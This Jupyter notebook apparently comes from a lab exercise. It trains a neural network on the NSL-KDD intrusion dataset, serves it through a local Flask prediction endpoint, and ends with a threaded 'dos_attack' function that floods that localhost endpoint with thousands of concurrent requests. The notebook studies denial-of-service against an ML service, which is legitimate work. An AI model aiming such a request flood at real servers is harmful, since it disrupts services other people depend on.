{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Do not run \"Run All\" to run the project. The DoS attack relies on having separate threads to host the server and run the attacks. Instead, manually run the pip install blocks, and from the block containing the imports, click on the imports block and in the top right of the block, run \"Execute Cell and Below\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install flask"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install pandas"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install scikit-learn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install requests"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The block below is where you may run \"Execute Cell and Below\" by clicking on the block below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from flask import Flask, request, jsonify\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import pandas as pd\n",
    "from sklearn.preprocessing import LabelEncoder, MinMaxScaler\n",
    "from sklearn.model_selection import train_test_split\n",
    "import torch.optim as optim\n",
    "import threading\n",
    "import time\n",
    "from concurrent.futures import ThreadPoolExecutor\n",
    "import requests\n",
    "import time\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def loadData():\n",
    "    trainData = pd.read_csv('datasets/KDDTrain+.txt', header=None)\n",
    "    testData = pd.read_csv('datasets/KDDTest+.txt', header=None)\n",
    "\n",
    "    train_features = trainData.iloc[:, :-1]\n",
    "    train_labels = trainData.iloc[:, -1]\n",
    "\n",
    "    test_features = testData.iloc[:, :-1]\n",
    "    test_labels = testData.iloc[:, -1]\n",
    "\n",
    "    categoryColumns = train_features.select_dtypes(include=['object']).columns.tolist()\n",
    "\n",
    "    text_to_num_encoder = LabelEncoder()\n",
    "\n",
    "\n",
    "    for c in categoryColumns:\n",
    "        train_features[c] = text_to_num_encoder.fit_transform(train_features[c])\n",
    "        test_features[c] = text_to_num_encoder.fit_transform(test_features[c])\n",
    "\n",
    "    \n",
    "    \n",
    "    train_labels = text_to_num_encoder.fit_transform(train_labels)\n",
    "    test_labels = text_to_num_encoder.fit_transform(test_labels)\n",
    "\n",
    " \n",
    "    standardizer = MinMaxScaler()\n",
    "    train_features = standardizer.fit_transform(train_features)\n",
    "    test_features = standardizer.fit_transform(test_features)\n",
    "\n",
    "    train_features = torch.tensor(train_features, dtype=torch.float32)\n",
    "    train_labels = torch.tensor(train_labels, dtype=torch.float32)\n",
    "\n",
    "    test_features = torch.tensor(test_features, dtype=torch.float32)\n",
    "    test_labels = torch.tensor(test_labels, dtype=torch.float32)\n",
    "\n",
    "    return train_features, train_labels, test_features, test_labels\n",
    "\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "X_train, y_train, X_test, y_test = loadData()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class flaskNN(nn.Module):\n",
    "    def __init__(self):\n",
    "        super(flaskNN, self).__init__()\n",
    "        self.fc1 = nn.Linear(X_train.shape[1], 128)\n",
    "        self.relu = nn.ReLU()\n",
    "        self.dp = nn.Dropout(p=0.5)\n",
    "        self.bn1 = nn.BatchNorm1d(128) \n",
    "        self.fc2 = nn.Linear(128, 64)\n",
    "        self.fc3 = nn.Linear(64, len(torch.unique(y_train)))\n",
    "\n",
    "    def forward(self, x):\n",
    "        x = self.fc1(x)\n",
    "        x = self.relu(x)\n",
    "        x = self.bn1(x)\n",
    "        x = self.dp(x)\n",
    "\n",
    "        x = self.fc2(x)\n",
    "        x = self.relu(x)\n",
    "        \n",
    "        x = self.fc3(x)\n",
    "        return x\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def train(model, optimizer, criterion, X_train, y_train, batch_size = 128, device ='cuda', epochs=10):\n",
    "    model.to(device)\n",
    "    dataset = torch.utils.data.TensorDataset(X_train, y_train)\n",
    "    dataloader = torch.utils.data.DataLoader(dataset, batch_size=batch_size, shuffle=True)\n",
    "\n",
    "    for ep in range(epochs):\n",
    "        ep_loss = 0.0\n",
    "        correct = 0\n",
    "        total = 0\n",
    "        model.train()\n",
    "\n",
    "\n",
    "        for inputs, labels in dataloader:\n",
    "            \n",
    "            inputs, labels = inputs.to(device), labels.to(device)\n",
    "\n",
    "            labels = labels.long()\n",
    "\n",
    "            optimizer.zero_grad()\n",
    "            outputs = model(inputs)\n",
    "            loss = criterion(outputs, labels)\n",
    "            loss.backward()\n",
    "            optimizer.step()\n",
    "            \n",
    "            ep_loss += loss.item()\n",
    "\n",
    "\n",
    "            _, predicted = torch.max(outputs, 1)\n",
    "            correct += (predicted == labels).sum().item()\n",
    "            total += labels.size(0)\n",
    "        \n",
    "        acc = 100 * correct / total\n",
    "        print(f\"Epoch [{ep+1}/{epochs}], Loss: {ep_loss:.4f}, Accuracy: {acc:.2f}%\")\n",
    "\n",
    "def evaluate(model, X_test, y_test, batch_size=32, device='cuda'):\n",
    "    model.to(device)\n",
    "    model.eval()\n",
    "    dataset = torch.utils.data.TensorDataset(X_test, y_test)\n",
    "    dataloader = torch.utils.data.DataLoader(dataset, batch_size=batch_size, shuffle=False)\n",
    "    \n",
    "    correct = 0\n",
    "    total = 0\n",
    "    \n",
    "    with torch.no_grad():\n",
    "        for inputs, labels in dataloader:\n",
    "            inputs, labels = inputs.to(device), labels.to(device)\n",
    "            outputs = model(inputs)\n",
    "            \n",
    "\n",
    "            _, predicted = torch.max(outputs, 1)\n",
    "            correct += (predicted == labels).sum().item()\n",
    "            total += labels.size(0)\n",
    "    \n",
    "  \n",
    "    test_accuracy = 100 * correct / total\n",
    "    print(f\"Test Accuracy: {test_accuracy:.2f}%\")\n",
    "    \n",
    "    return test_accuracy\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Uncomment if you would like to train the model yourself, however this is not necessary as a pre-trained model (Model/flaskNN.pth) exists.\n",
    "\n",
    "# flaskModel = flaskNN().to('cuda')\n",
    "\n",
    "# criterion = nn.CrossEntropyLoss()\n",
    "# optimizer = optim.Adam(flaskModel.parameters(), lr=0.001)\n",
    "\n",
    "# train(flaskModel, optimizer=optimizer, criterion=criterion, X_train=X_train, y_train=y_train, epochs = 20)\n",
    "# torch.save(flaskModel, 'Model/flaskNN.pth')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "if torch.cuda.is_available():\n",
    "        loadedModel = torch.load('Model/flaskNN.pth')\n",
    "else:\n",
    "        loadedModel = torch.load('Model/flaskNN.pth', map_location=torch.device(device))\n",
    "        \n",
    "evaluate(loadedModel, X_test=X_test, y_test=y_test, device=device)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "app = Flask(__name__)\n",
    "\n",
    "model = loadedModel.to(device)\n",
    "model.eval()\n",
    "\n",
    "@app.route('/predict', methods=['POST'])\n",
    "def predict():\n",
    "    data = request.json['data']\n",
    "    input = torch.tensor(data, dtype=torch.float32).to(device)\n",
    "\n",
    "    with torch.no_grad():\n",
    "        outputs = model(input)\n",
    "        _, predictions = torch.max(outputs, 1)\n",
    "\n",
    "        return jsonify({'predictions': predictions.cpu().tolist()})\n",
    "    \n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Click on the link that is provided, it should give a 404. Attacks from the blocks below should update the log for this console.\n",
    "# The result of the DOS attacks should be one of two things:\n",
    "# 1) The attack is only semi-successful, and slows down inputs from the browser (refreshing sends another 404, if there is a delay, then there's a success)\n",
    "# 2) The NN should crash, an exception should occur (you might need to view the log as \"scrollable\" at the bottom of the output and scroll up.)\n",
    "#    The server should still receive inputs from the browser, but the neural network model for the server should be timed out (event log pipe is missing).\n",
    "def runServer():\n",
    "    app.run(debug=True, use_reloader=False)\n",
    "serverThread = threading.Thread(target=runServer)\n",
    "serverThread.start()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "input = [4.0268, 6.8709, 3.278, 4.2222, 2.0739, 7.557, 8.5444, 4.6199, 8.5978, 6.0871, \n",
    " 5.0458, -0.4034, 4.7607, 2.0641, 7.0293, 2.9484, 5.8933, 7.2381, 2.0542, \n",
    " 0.3832, 0.0443, 4.2011, 4.4006, 1.0722, 0.9632, 8.5004, 9.8459, 8.8029, \n",
    " 0.1164, 3.804, 1.8567, 9.5885, 1.8865, -0.1943, 2.5243, 7.5566, 5.5616, \n",
    " 5.2196, 9.4582, 5.6767, 8.5703, 0.78]\n",
    "\n",
    "def sendJSONRequest(val=None):\n",
    "    url = \"http://127.0.0.1:5000/predict\"\n",
    "    request = {'data': [input]}\n",
    "    response = requests.post(url, json=request)\n",
    "    print(response.json())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#So we have to use ThreadPoolExecutor to concurrently spam the server rather than sequentially. TPE is good because it can automatically deallocate resources\n",
    "#once the attack is done, as opposed to above's threading.Thread(), since I want the server to persist.\n",
    "def dos_attack(requestCount, threadCount):\n",
    "    executor = ThreadPoolExecutor(max_workers=threadCount)\n",
    "    start = time.time()\n",
    "    results = list(executor.map(sendJSONRequest, range(requestCount)))\n",
    "    end = time.time()\n",
    "    executor.shutdown()\n",
    "    print(f'Time elapsed: {end-start}')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dos_attack(5000, 50) # This attack should take a long time (10+ minutes) to complete.\n",
    "# Manually stop or re-open VS Code to kill it and its threads if the attack persists."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
